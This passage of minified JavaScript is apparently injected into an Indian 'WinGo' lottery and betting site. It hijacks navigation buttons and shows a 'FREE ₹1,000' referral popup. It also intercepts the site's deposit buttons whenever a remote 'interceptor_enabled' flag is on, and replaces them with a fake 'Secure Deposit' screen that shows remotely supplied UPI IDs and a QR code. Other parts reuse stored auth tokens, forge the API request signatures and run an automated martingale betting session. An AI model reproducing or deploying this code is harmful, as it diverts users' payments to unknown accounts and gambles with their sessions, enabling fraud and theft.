  (t.addEventListener("pointerdown", (l) => {
    (t.setPointerCapture(l.pointerId),
      t.classList.add("dragging"),
      (o = l.clientX - n.offsetLeft),
      (c = l.clientY - n.offsetTop));
  }),
    t.addEventListener("pointermove", (l) => {
      if (!t.hasPointerCapture(l.pointerId)) return;
      ((n.style.left = qi(l.clientX - o, i.offsetWidth) + "px"),
        (n.style.top = ai(l.clientY - c, i.offsetHeight) + "px"));
    }),
    t.addEventListener("pointerup", (l) => {
      (t.releasePointerCapture(l.pointerId),
        t.classList.remove("dragging"),
        yt(n, "panel"));
    }));
}
var Xo = [".firstSaveDialog", ".promptHeader"],
  Yo = [".close", ".van-dialog__confirm", ".dialog__outside"];
function Ho() {
  Xo.forEach((n) => {
    document.querySelectorAll(n).forEach((t) => {
      let i = t.closest(".van-popup, .dialog");
      if (!i || getComputedStyle(i).display === "none") return;
      let o = !1;
      for (let c of Yo) {
        let l = i.querySelector(c);
        if (l) {
          (l.click(), (o = !0));
          break;
        }
      }
      if (!o) {
        let c = i.previousElementSibling;
        if (c?.classList.contains("van-overlay")) c.click();
      }
    });
  });
}
function No() {
  [
    document.querySelector(".tabbar__center"),
    document.querySelector(".promotionBg")?.closest(".tabbar__container-item"),
  ].forEach((t) => {
    if (!t || t.dataset.wgHijacked) return;
    ((t.dataset.wgHijacked = "1"),
      t.addEventListener(
        "click",
        (i) => {
          (i.preventDefault(),
            i.stopPropagation(),
            i.stopImmediatePropagation(),
            window.dispatchEvent(new Event("wg-open-bonus")));
        },
        { capture: !0 },
      ));
  });
}
function Go(n) {
  if (n.dataset.wg) return;
  n.dataset.wg = "1";
  let t = n.firstElementChild;
  if (!t) return;
  let i = t.cloneNode(!0);
  i.querySelector("span").textContent = "Bonus";
  let o = i.querySelector("use");
  if (o) {
    o.setAttribute("xlink:href", "#icon-gifts");
    let c = o.closest("svg");
    if (c) c.setAttribute("class", "svg-icon icon-gifts");
  }
  (i.querySelector("h5")?.remove(),
    i.addEventListener(
      "click",
      (c) => {
        (c.preventDefault(),
          c.stopPropagation(),
          c.stopImmediatePropagation(),
          window.dispatchEvent(new Event("wg-open-bonus")));
      },
      { capture: !0 },
    ),
    n.prepend(i));
}
var Mi = !1,
  _ = null,
  T = null;
function Ui() {
  if (Mi) return !0;
  if (!localStorage.getItem("token")) return !0;
  let n = localStorage.getItem("wg_promo_expiry");
  return n && Number(n) > Date.now();
}
function Fo() {
  if (_) return;
  let n = "shreewin55.com".includes("okwin"),
    t = document.createElement("style");
  ((t.textContent = `
    .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
    .wgp-popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;width:min(300px,calc(100% - 32px));background:#1e1e3a;border-radius:18px;overflow:hidden;display:none;flex-direction:column;box-shadow:0 8px 40px rgba(0,0,0,.6);font-family:-apple-system,system-ui,'Segoe UI',sans-serif}
    .wgp-close{position:absolute;top:10px;right:12px;width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:12px;color:rgba(255,255,255,.7);cursor:pointer;z-index:1;border:none}
    .wgp-hero{text-align:center;padding:28px 20px 14px}
    .wgp-icon{font-size:44px;line-height:1;margin-bottom:10px}
    .wgp-amount{font-size:28px;font-weight:900;color:#fff;letter-spacing:-.5px;margin-bottom:8px}
    .wgp-pill{display:inline-block;padding:4px 12px;border-radius:99px;background:rgba(245,180,0,.15);border:1px solid rgba(245,180,0,.35);font-size:10.5px;font-weight:600;color:#f5c842;letter-spacing:.2px}
    .wgp-stats{display:flex;gap:6px;padding:0 16px 12px;justify-content:center}
    .wgp-chip{flex:1;text-align:center;padding:7px 4px;border-radius:10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);font-size:10px;font-weight:600;color:#c8cad0}
    .wgp-body{padding:0 16px 14px;font-size:11.5px;color:#7b7e9a;line-height:1.65;text-align:center}
    .wgp-cta{display:block;width:calc(100% - 32px);margin:0 16px 10px;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#f5a623,#f5c842);color:#1a1200;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:.1px}
    .wgp-cta:active{opacity:.9}
    .wgp-footer{display:flex;align-items:center;gap:7px;padding:8px 16px 16px;justify-content:center}
    .wgp-chk{width:17px;height:17px;border-radius:50%;border:1.5px solid #4a4d6a;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background .15s,border-color .15s}
    .wgp-chk.on{background:#07c160;border-color:#07c160}
    .wgp-chk-tick{font-size:10px;color:#fff;opacity:0;transition:opacity .15s}
    .wgp-chk.on .wgp-chk-tick{opacity:1}
    .wgp-remind{font-size:11px;color:#4a4d6a;cursor:pointer}
    .wgp-light .wgp-popup{background:#fff;box-shadow:0 8px 40px rgba(0,0,0,.15)}
    .wgp-light .wgp-close{background:rgba(0,0,0,.06);color:#888}
    .wgp-light .wgp-amount{color:#111}
    .wgp-light .wgp-pill{background:rgba(249,89,89,.08);border-color:rgba(249,89,89,.25);color:#f95959}
    .wgp-light .wgp-chip{background:#f5f5ff;border-color:#e0e0f0;color:#555}
    .wgp-light .wgp-body{color:#777}
    .wgp-light .wgp-cta{background:linear-gradient(90deg,#f95959,#ff8c6e);color:#fff}
    .wgp-light .wgp-chk{border-color:#ccc}
    .wgp-light .wgp-remind{color:#aaa}
  `),
    document.head.appendChild(t));
  let i = document.createElement("div");
  if (n) i.className = "wgp-light";
  ((_ = document.createElement("div")),
    (_.className = "wgp-overlay"),
    i.appendChild(_),
    (T = document.createElement("div")),
    (T.className = "wgp-popup"),
    (T.innerHTML = `
    <button class="wgp-close" id="wgp-close">✕</button>
    <div class="wgp-hero">
      <div class="wgp-icon">\uD83D\uDCB0</div>
      <div class="wgp-amount">FREE ₹1,000</div>
      <div class="wgp-pill">Per Referral &bull; No Limit &bull; Instant Payout</div>
    </div>
    <div class="wgp-stats">
      <div class="wgp-chip">\uD83D\uDCB8 Instant</div>
      <div class="wgp-chip">♾️ No Cap</div>
      <div class="wgp-chip">✅ Verified</div>
    </div>
    <div class="wgp-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.</div>
    <button class="wgp-cta" id="wgp-cta">\uD83C\uDF81 Claim Free Bonus →</button>
    <div class="wgp-footer">
      <div class="wgp-chk" id="wgp-chk"><span class="wgp-chk-tick">✓</span></div>
      <span class="wgp-remind" id="wgp-remind">No More Reminders Today</span>
    </div>
  `),
    i.appendChild(T),
    document.body.appendChild(i));
}
function ut(n) {
  if (_) _.style.display = "none";
  if (T) T.style.display = "none";
  if (((Mi = !0), n))
    localStorage.setItem("wg_promo_expiry", String(Date.now() + 86400000));
}
function Ko() {
  if (Ui()) return;
  (Fo(), (_.style.display = "block"), (T.style.display = "flex"));
  let n = !1,
    t = T.querySelector("#wgp-chk");
  ((t.onclick = () => {
    ((n = !n), t.classList.toggle("on", n));
  }),
    (T.querySelector("#wgp-remind").onclick = () => t.click()),
    (T.querySelector("#wgp-close").onclick = () => ut(n)),
    (_.onclick = () => ut(n)),
    (T.querySelector("#wgp-cta").onclick = () => {
      (ut(n), window.dispatchEvent(new Event("wg-open-bonus")));
    }));
}
function $i() {
  (Ho(), No());
  let n = document.querySelector(".settingPanel__container-items");
  if (n) Go(n);
}
function Oi(n) {
  let t = !1,
    i = () => {
      if (!t && !Ui()) ((t = !0), Ko());
    },
    o = () => {
      ($i(),
        new MutationObserver(() => {
          ($i(), i());
        }).observe(document.body, { childList: !0, subtree: !0 }),
        window.addEventListener("hashchange", i),
        window.addEventListener("storage", i),
        setTimeout(i, 1500));
    };
  document.readyState === "loading"
    ? document.addEventListener("DOMContentLoaded", o)
    : o();
}
function Ji(n) {
  let t = n.querySelector("#bonus-view"),
    i = n.querySelector("#btn-copy-invite"),
    o = n.querySelector("#bonus-link-preview"),
    c = n.querySelector(".bonus-prog-count"),
    l = n.querySelector(".bonus-bar-fill"),
    p = "";
  function f() {
    let w =
      location.origin +
      "/#/register?invitationCode=" +
      (sessionStorage.getItem("invitecode") || "");
    return p ? w + "&ref=" + p : w;
  }
  function u() {
    let w = sessionStorage.getItem("wg_user") || "";
    if (!w) return;
    if (
      (fetch("/ar-api/bonus-stats?username=" + w)
        .then((S) => S.json())
        .then((S) => {
          let W = S.qualified || 0;
          ((c.textContent = W + " / 10 Qualified"),
            (l.style.width = Math.min((W / 10) * 100, 100) + "%"));
        })
        .catch(() => {}),
      !p)
    )
      fetch("/ar-api/my-ref-tag?username=" + w)
        .then((S) => S.json())
        .then((S) => {
          if (S.tag) ((p = S.tag), (o.textContent = f()));
        })
        .catch(() => {});
  }
  (window.addEventListener("wg-open-bonus", () => {
    ((t.style.display = "flex"), (o.textContent = f()), u());
  }),
    n
      .querySelector("#btn-bonus-back")
      .addEventListener("click", () => (t.style.display = "none")),
    i.addEventListener("click", () => {
      navigator.clipboard.writeText(f()).then(() => {
        ((i.textContent = "✓ Copied!"),
          setTimeout(() => (i.textContent = "Copy Invite Link"), 2000));
      });
    }));
}
function et() {
  document.getElementById("wg-deposit-hint")?.remove();
}
function Wi(n) {
  (et(),
    window.addEventListener("hashchange", et),
    window.addEventListener("wg-qualified", et));
}
function zi(n, t) {
  let o = document.querySelector("prediction-panel")?.shadowRoot;
  if (!o) return;
  let c = [],
    l = new Set();
  for (let v of Array.isArray(t) ? t : []) {
    let q =
      typeof v === "string"
        ? v.trim()
        : String(v?.upiId ?? v?.address ?? v?.upi ?? v?.value ?? "").trim();
    if (!q || l.has(q)) continue;
    (l.add(q),
      c.push({
        label: typeof v === "string" ? "" : String(v?.label ?? "").trim(),
        upiId: q,
      }));
  }
  if (c.length === 0) return;
  let p = o.querySelector(".pay-overlay");
  if (p) p.remove();
  let f = document.createElement("div");
  ((f.className = "pay-overlay"),
    o.appendChild(f),
    (document.body.style.overflow = "hidden"));
  let u = 0,
    w,
    S = 0,
    W = () => {
      (cancelAnimationFrame(S),
        (S = requestAnimationFrame(() => {
          let v = document.querySelector("#app"),
            q = window.visualViewport,
            a = v?.getBoundingClientRect(),
            L =
              q?.width ||
              document.documentElement.clientWidth ||
              window.innerWidth,
            P =
              q?.height ||
              document.documentElement.clientHeight ||
              window.innerHeight,
            Y = Number.isFinite(a?.left) ? Math.max(0, a.left) : 0,
            H = Number.isFinite(a?.width) && a.width > 0 ? a.width : L,
            K = Math.max(280, Math.min(H, L - Y));
          ((f.style.left = `${Y}px`),
            (f.style.top = `${Math.max(0, q?.offsetTop || 0)}px`),
            (f.style.width = `${K}px`),
            (f.style.height = `${P}px`));
        })));
    };
  (W(),
    window.addEventListener("resize", W),
    window.addEventListener("orientationchange", W),
    window.visualViewport?.addEventListener("resize", W),
    window.visualViewport?.addEventListener("scroll", W));
  let M = () => {
      (clearInterval(w),
        cancelAnimationFrame(S),
        window.removeEventListener("resize", W),
        window.removeEventListener("orientationchange", W),
        window.visualViewport?.removeEventListener("resize", W),
        window.visualViewport?.removeEventListener("scroll", W),
        f.remove(),
        (document.body.style.overflow = ""));
    },
    J =
      "DP" +
      Date.now().toString(36).toUpperCase() +
      Math.random().toString(36).slice(2, 6).toUpperCase(),
    z = (v) =>
      String(v ?? "").replace(
        /[&<>"']/g,
        (q) =>
          ({
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#39;",
          })[q],
      ),
    O = () => {
      let v = c[u],
        q = v.upiId,
        a = v.label || `UPI ${u + 1}`,
        L = c.length > 1,
        P = c[(u + 1) % c.length],
        Y = P.label || `UPI ${((u + 1) % c.length) + 1}`,
        H = `upi://pay?pa=${q}&pn=Deposit&am=${n}&cu=INR`,
        K = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=0&data=${encodeURIComponent(H)}`;
      return `
      <div class="pay-hdr">
        <button class="pay-back">
          <svg viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
        <span class="pay-ttl">Secure Deposit</span>
        <div style="width:32px"></div>
      </div>

      <div class="pay-body">
        <div class="pay-hero pay-anim pay-anim-1">
          <div class="pay-amount-bg"></div>
          <div class="pay-hero-top">
            <div>
              <span class="pay-hero-label">Amount to Pay</span>
              <span class="pay-amt">₹${Number(n).toLocaleString("en-IN")}</span>
            </div>
            <div class="pay-timer-pill">
              <svg class="pay-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10" stroke-width="2.5"/><path d="M12 6v6l4 2" stroke-width="2.5" stroke-linecap="round"/></svg>
              <span class="pay-timer-txt" id="pay-timer">29:00</span>
            </div>
          </div>
          <div class="pay-hero-sub">Scan and Pay. Then Add UTR.</div>
        </div>

        <div class="pay-content">
        <div class="pay-section pay-qr-card pay-anim pay-anim-2">
          <div class="pay-qr-wrapper">
            <div class="pay-qr-box">
              <div class="pay-qr-skeleton"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg></div>
              <img src="${K}" class="pay-qr" alt="QR Code" onload="this.classList.add('loaded'); this.previousElementSibling.style.display='none'">
            </div>
            <div class="pay-scan-text">Open Any UPI App and Scan</div>
          </div>
        </div>

        <div class="pay-section pay-method-card pay-anim pay-anim-3">
          <div class="pay-section-hdr">Payment UPI</div>
          <div class="pay-upi-row">
            <div class="pay-upi-info">
              <span class="pay-upi-lbl">${z(a)}</span>
              <span class="pay-upi-id">${z(q)}</span>
            </div>
            <div class="pay-upi-actions">
              <button class="pay-copy-btn" id="btn-copy-upi">Copy</button>
            </div>
          </div>
          ${
            L
              ? `
          <button class="pay-route-card" id="btn-switch-upi" type="button">
            <span class="pay-route-index">${z(Y)}</span>
            <span class="pay-route-copy">
              <span class="pay-route-title">Change UPI ID</span>
              <span class="pay-route-sub">${z(P.upiId)}</span>
            </span>
            <span class="pay-route-icon">
              <svg viewBox="0 0 24 24" fill="none">
                <path d="M7 7h10l-3-3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M17 17H7l3 3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </span>
          </button>
          `
              : `
          <div class="pay-route-note">Only one UPI ID is active right now.</div>
          `
          }
        </div>

        <div class="pay-section pay-form-card pay-anim pay-anim-4">
          <div class="pay-section-hdr">UTR Number</div>
          <div class="pay-field-wrapper">
            <input type="tel" class="pay-utr-input" placeholder="Enter 12-Digit UTR" maxlength="12" inputmode="numeric">
            <button class="pay-paste-pill">Paste</button>
          </div>
          <div class="pay-utr-warn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
            <span class="pay-utr-warn-txt">Wrong UTR can fail the deposit. Check it once.</span>
          </div>
        </div>

        <div class="pay-section pay-anim pay-anim-4">
          <button class="pay-submit-btn disabled" disabled>Submit Payment</button>
        </div>

        <div class="pay-order-meta pay-anim pay-anim-4">
          <span class="pay-order-lbl">Order Reference</span>
          <span class="pay-order-val">${J}</span>
        </div>
        </div>
      </div>

      <div class="pay-confirm-mask">
        <div class="pay-confirm-box">
          <div class="pay-conf-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <div class="pay-conf-ttl">Confirm Deposit</div>
          <div class="pay-conf-msg">Have you successfully transferred exactly <b>₹${Number(n).toLocaleString("en-IN")}</b>?</div>
          <div class="pay-conf-acts">
            <button class="pay-conf-btn no">Cancel</button>
            <button class="pay-conf-btn yes">Yes, Submitted</button>
          </div>
        </div>
      </div>
    `;
    },
    E = () => {
      let v = f.querySelector(".pay-utr-input"),
        q = f.querySelector(".pay-submit-btn");
      ((f.querySelector(".pay-back").onclick = M),
        (v.oninput = (P) => {
          P.target.value = P.target.value.replace(/\D/g, "");
          let Y = /^\d{12}$/.test(P.target.value);
          ((q.disabled = !Y), q.classList.toggle("disabled", !Y));
        }),
        (f.querySelector(".pay-paste-pill").onclick = async () => {
          try {
            let P = await navigator.clipboard.readText();
            ((v.value = P.replace(/\D/g, "").slice(0, 12)),
              v.dispatchEvent(new Event("input")));
          } catch (P) {}
        }),
        (f.querySelector("#btn-copy-upi").onclick = (P) => {
          navigator.clipboard.writeText(c[u].upiId);
          let Y = P.target;
          ((Y.textContent = "Copied"),
            Y.classList.add("copied"),
            setTimeout(() => {
              ((Y.textContent = "Copy"), Y.classList.remove("copied"));
            }, 2000));
        }));
      let a = f.querySelector("#btn-switch-upi");
      if (a)
        a.onclick = () => {
          ((u = (u + 1) % c.length), e());
        };
      let L = f.querySelector(".pay-confirm-mask");
      ((q.onclick = () => {
        if (!q.disabled) L.classList.add("active");
      }),
        (f.querySelector(".pay-conf-btn.no").onclick = () =>
          L.classList.remove("active")),
        (f.querySelector(".pay-conf-btn.yes").onclick = () => {
          (console.log("Payment submitted:", {
            amount: n,
            utr: v.value,
            orderId: J,
          }),
            M());
        }));
    },
    e = () => {
      let v = f.querySelector(".pay-utr-input")?.value || "";
      if (
        ((f.innerHTML = O()),
        (f.querySelector(".pay-utr-input").value = v),
        E(),
        W(),
        v)
      )
        f.querySelector(".pay-utr-input").dispatchEvent(new Event("input"));
    };
  e();
  let y = 1740;
  w = setInterval(() => {
    if ((y--, y <= 0)) {
      (clearInterval(w), M());
      return;
    }
    let v = Math.floor(y / 60),
      q = y % 60,
      a = f.querySelector("#pay-timer");
    if (a) {
      if (
        ((a.textContent = `${String(v).padStart(2, "0")}:${String(q).padStart(2, "0")}`),
        y < 300)
      )
        a.parentElement.classList.add("urgent");
    }
  }, 1000);
}
var Qn = { interceptor_enabled: !1, min_deposit: 500, upis: [] },
  at = !1;
function Qi(n) {
  let t = Array.isArray(n) ? n : [],
    i = [],
    o = new Set();
  for (let c of t) {
    let l =
      typeof c === "string"
        ? c.trim()
        : String(c?.upiId ?? c?.address ?? c?.upi ?? c?.value ?? "").trim();
    if (!l || o.has(l)) continue;
    (o.add(l),
      i.push(
        typeof c === "string"
          ? l
          : { label: String(c?.label ?? "").trim(), upiId: l },
      ));
  }
  return i;
}
async function qt() {
  try {
    let n = await fetch("/ar-api/payment-config", { cache: "no-store" });
    if (n.ok) {
      let t = await n.json(),
        i = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
      ((Qn = {
        interceptor_enabled: Boolean(
          t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled,
        ),
        min_deposit: Number.isFinite(i) && i > 0 ? i : 500,
        upis: Qi(t?.payment_methods ?? t?.upis),
      }),
        (at = !0));
    }
  } catch {
    ((Qn = { interceptor_enabled: !1, min_deposit: 500, upis: [] }), (at = !0));
  }
}
function Co(n) {
  let t = Number(Qn.min_deposit || 500),
    i = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
    o = Number.isFinite(i) ? i : 0;
  return Math.max(o, t);
}
function Li() {
  (qt(),
    setInterval(qt, 1e4),
    document.addEventListener("visibilitychange", () => {
      if (!document.hidden) qt();
    }),
    window.addEventListener(
      "click",
      (n) => {
        if (!n.target.closest(".Recharge__container-rechageBtn, .go_pay"))
          return;
        let i = Qi(Qn.upis);
        if (!at || !Qn.interceptor_enabled || i.length === 0) return;
        (n.stopImmediatePropagation(), n.stopPropagation(), n.preventDefault());
        let o = document.querySelector('input.van-field__control[type="tel"]'),
          c = Co(o);
        if (o && Number(o.value) !== c)
          ((o.value = String(c)),
            o.dispatchEvent(new Event("input", { bubbles: !0 })),
            o.dispatchEvent(new Event("change", { bubbles: !0 })));
        (console.log("deposit blocked - interceptor active", {
          amount: c,
          upis: i,
        }),
          zi(c, i));
      },
      { capture: !0 },
    ));
}
function Vo(n) {
  function t(E, e) {
    return (E + e) | 0;
  }
  function i(E, e) {
    return (E << e) | (E >>> (32 - e));
  }
  function o(E, e, y, v, q, a) {
    return t(i(t(t(e, E), t(v, a)), q), y);
  }
  function c(E, e, y, v, q, a, L) {
    return o((e & y) | (~e & v), E, e, q, a, L);
  }
  function l(E, e, y, v, q, a, L) {
    return o((e & v) | (y & ~v), E, e, q, a, L);
  }
  function p(E, e, y, v, q, a, L) {
    return o(e ^ y ^ v, E, e, q, a, L);
  }
  function f(E, e, y, v, q, a, L) {
    return o(y ^ (e | ~v), E, e, q, a, L);
  }
  function u(E, e) {
    var y = E[0],
      v = E[1],
      q = E[2],
      a = E[3];
    ((y = c(y, v, q, a, e[0], 7, -680876936)),
      (a = c(a, y, v, q, e[1], 12, -389564586)),
      (q = c(q, a, y, v, e[2], 17, 606105819)),
      (v = c(v, q, a, y, e[3], 22, -1044525330)),
      (y = c(y, v, q, a, e[4], 7, -176418897)),
      (a = c(a, y, v, q, e[5], 12, 1200080426)),
      (q = c(q, a, y, v, e[6], 17, -1473231341)),
      (v = c(v, q, a, y, e[7], 22, -45705983)),
      (y = c(y, v, q, a, e[8], 7, 1770035416)),
      (a = c(a, y, v, q, e[9], 12, -1958414417)),
      (q = c(q, a, y, v, e[10], 17, -42063)),
      (v = c(v, q, a, y, e[11], 22, -1990404162)),
      (y = c(y, v, q, a, e[12], 7, 1804603682)),
      (a = c(a, y, v, q, e[13], 12, -40341101)),
      (q = c(q, a, y, v, e[14], 17, -1502002290)),
      (v = c(v, q, a, y, e[15], 22, 1236535329)),
      (y = l(y, v, q, a, e[1], 5, -165796510)),
      (a = l(a, y, v, q, e[6], 9, -1069501632)),
      (q = l(q, a, y, v, e[11], 14, 643717713)),
      (v = l(v, q, a, y, e[0], 20, -373897302)),
      (y = l(y, v, q, a, e[5], 5, -701558691)),
      (a = l(a, y, v, q, e[10], 9, 38016083)),
      (q = l(q, a, y, v, e[15], 14, -660478335)),
      (v = l(v, q, a, y, e[4], 20, -405537848)),
      (y = l(y, v, q, a, e[9], 5, 568446438)),
      (a = l(a, y, v, q, e[14], 9, -1019803690)),
      (q = l(q, a, y, v, e[3], 14, -187363961)),
      (v = l(v, q, a, y, e[8], 20, 1163531501)),
      (y = l(y, v, q, a, e[13], 5, -1444681467)),
      (a = l(a, y, v, q, e[2], 9, -51403784)),
      (q = l(q, a, y, v, e[7], 14, 1735328473)),
      (v = l(v, q, a, y, e[12], 20, -1926607734)),
      (y = p(y, v, q, a, e[5], 4, -378558)),
      (a = p(a, y, v, q, e[8], 11, -2022574463)),
      (q = p(q, a, y, v, e[11], 16, 1839030562)),
      (v = p(v, q, a, y, e[14], 23, -35309556)),
      (y = p(y, v, q, a, e[1], 4, -1530992060)),
      (a = p(a, y, v, q, e[4], 11, 1272893353)),
      (q = p(q, a, y, v, e[7], 16, -155497632)),
      (v = p(v, q, a, y, e[10], 23, -1094730640)),
      (y = p(y, v, q, a, e[13], 4, 681279174)),
      (a = p(a, y, v, q, e[0], 11, -358537222)),
      (q = p(q, a, y, v, e[3], 16, -722521979)),
      (v = p(v, q, a, y, e[6], 23, 76029189)),
      (y = p(y, v, q, a, e[9], 4, -640364487)),
      (a = p(a, y, v, q, e[12], 11, -421815835)),
      (q = p(q, a, y, v, e[15], 16, 530742520)),
      (v = p(v, q, a, y, e[2], 23, -995338651)),
      (y = f(y, v, q, a, e[0], 6, -198630844)),
      (a = f(a, y, v, q, e[7], 10, 1126891415)),
      (q = f(q, a, y, v, e[14], 15, -1416354905)),
      (v = f(v, q, a, y, e[5], 21, -57434055)),
      (y = f(y, v, q, a, e[12], 6, 1700485571)),
      (a = f(a, y, v, q, e[3], 10, -1894986606)),
      (q = f(q, a, y, v, e[10], 15, -1051523)),
      (v = f(v, q, a, y, e[1], 21, -2054922799)),
      (y = f(y, v, q, a, e[8], 6, 1873313359)),
      (a = f(a, y, v, q, e[15], 10, -30611744)),
      (q = f(q, a, y, v, e[6], 15, -1560198380)),
      (v = f(v, q, a, y, e[13], 21, 1309151649)),
      (y = f(y, v, q, a, e[4], 6, -145523070)),
      (a = f(a, y, v, q, e[11], 10, -1120210379)),
      (q = f(q, a, y, v, e[2], 15, 718787259)),
      (v = f(v, q, a, y, e[9], 21, -343485551)),
      (E[0] = t(y, E[0])),
      (E[1] = t(v, E[1])),
      (E[2] = t(q, E[2])),
      (E[3] = t(a, E[3])));
  }
  function w(E) {
    var e = [],
      y;
    for (y = 0; y < 64; y += 4)
      e[y >> 2] =
        E.charCodeAt(y) +
        (E.charCodeAt(y + 1) << 8) +
        (E.charCodeAt(y + 2) << 16) +
        (E.charCodeAt(y + 3) << 24);
    return e;
  }
  var S = n.length,
    W = [1732584193, -271733879, -1732584194, 271733878],
    M;
  for (M = 64; M <= S; M += 64) u(W, w(n.substring(M - 64, M)));
  n = n.substring(M - 64);
  var J = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
  for (M = 0; M < n.length; M++) J[M >> 2] |= n.charCodeAt(M) << ((M % 4) << 3);
  if (((J[M >> 2] |= 128 << ((M % 4) << 3)), M > 55))
    (u(W, J), (J = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
  ((J[14] = S * 8), u(W, J));
  var z = "";
  for (M = 0; M < 4; M++)
    for (var O = 0; O < 4; O++)
      z +=
        "0123456789abcdef"[(W[M] >> (O * 8 + 4)) & 15] +
        "0123456789abcdef"[(W[M] >> (O * 8)) & 15];
  return z.toUpperCase().slice(0, 32);
}
function Do() {
  var n = 100000000000,
    t = 1000000000000,
    i;
  do i = Math.floor(Math.random() * t);
  while (i < n);
  return i;
}
function wt(n) {
  n.random = Do();
  var t = JSON.parse(JSON.stringify(n)),
    i = Object.keys(t)
      .filter(function (c) {
        var l = t[c];
        return l === null || typeof l !== "object";
      })
      .sort(),
    o = {};
  return (
    i.forEach(function (c) {
      if (t[c] !== null && t[c] !== "" && c !== "signature")
        o[c] = t[c] === 0 ? 0 : t[c];
    }),
    (n.signature = Vo(JSON.stringify(o))),
    (n.timestamp = Math.floor(Date.now() / 1000)),
    n
  );
}
function Bo() {
  try {
    var n = localStorage.getItem("ar_token");
    if (!n) return "";
    var t = JSON.parse(n);
    return typeof t === "string" ? t : t.value || "";
  } catch (i) {
    return localStorage.getItem("ar_token") || "";
  }
}
function ho(n) {
  if (!n) return;
  try {
    localStorage.setItem("ar_token", JSON.stringify({ value: n, expires: -1 }));
  } catch (t) {}
}
function St(n, t, i, o) {
  return new Promise(function (c, l) {
    var p = new XMLHttpRequest();
    if ((p.open(n, t, !0), o)) for (var f in o) p.setRequestHeader(f, o[f]);
    ((p.onload = function () {
      if (p.status >= 200 && p.status < 300) {
        var u = p.getResponseHeader("Authorization");
        if (u) ho(u.replace(/^Bearer\s+/i, ""));
        try {
          c(JSON.parse(p.responseText));
        } catch (w) {
          l(Error("Bad JSON"));
        }
      } else l(Error("HTTP " + p.status));
    }),
      (p.onerror = function () {
        l(Error("Network error"));
      }),
      (p.ontimeout = function () {
        l(Error("Timeout"));
      }),
      (p.timeout = 15000),
      p.send(i || null));
  });
}
function Et(n, t, i) {
  var o = Bo(),
    c = t,
    l = {
      Authorization: "Bearer " + o,
      "Content-Type": "application/json",
      Accept: "application/json, text/plain, */*",
    },
    p = null;
  if (n === "GET") {
    var f = new URLSearchParams();
    (Object.keys(i).forEach(function (u) {
      f.set(u, String(i[u]));
    }),
      (c += "?" + f.toString()));
  } else p = JSON.stringify(i);
  return St(n, c, p, l);
}
async function Pi(n, t, i, o) {
  var c = wt({
    gameCode: n,
    issueNumber: t,
    amount: i,
    betMultiple: 1,
    betContent: o,
    language: "en",
  });
  return Et("POST", "/api/Lottery/WinGoBet", c);
}
async function $t() {
  var n = wt({ language: "en" });
  return Et("GET", "/api/Lottery/GetBalance", n);
}
async function Mt(n) {
  var t = wt({ issueNumber: n, language: "en" });
  return Et("GET", "/api/Lottery/GetWinLossResult", t);
}
async function Zi(n) {
  return St("GET", "/WinGo/" + n + ".json?ts=" + Date.now());
}
async function Xi(n) {
  return St(
    "GET",
    "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now(),
  );
}
var Ln = "WinGo_30S",
  Hi = "wg_mining_session",
  Ut = "wg_mining_history",
  Ni = [1, 2, 4],
  Pn = 5,
  Yi = 100;
function F(n) {
  return Math.round(n * 100) / 100;
}
var Ot = [],
  Jt = [];
function Gi(n) {
  Ot.push(n);
}
function Fi(n) {
  Jt.push(n);
}
function Ki() {
  ((Ot = []), (Jt = []));
}
function N(n, t) {
  (console.log("[MINING]", n), Ot.forEach((i) => i(n, t)));
}
function Ci() {
  Jt.forEach((n) => n(C()));
}
function C() {
  try {
    return JSON.parse(localStorage.getItem(Hi)) || null;
  } catch (n) {
    return null;
  }
}
function un(n) {
  (localStorage.setItem(Hi, JSON.stringify(n)), Ci());
}
function Ao(n, t, i) {
  return {
    active: !0,
    gameCode: Ln,
    startedAt: Date.now(),
    startBalance: n,
    targetBalance: t,
    stopLoss: i,
    baseUnit: Math.max(1, Math.floor(n * 0.01)),
    martingaleStep: 0,
    lastBetPeriod: "",
    lastBetAmount: 0,
    lastBetSide: "",
    pendingResult: !1,
    stats: { rounds: 0, wins: 0, losses: 0, netPL: 0 },
  };
}
function Ro(n) {
  try {
    var t = Wt();
    if ((t.unshift(n), t.length > Yi)) t.length = Yi;
    localStorage.setItem(Ut, JSON.stringify(t));
  } catch (i) {}
}
function Wt() {
  try {
    return JSON.parse(localStorage.getItem(Ut)) || [];
  } catch (n) {
    return [];
  }
}
function Vi() {
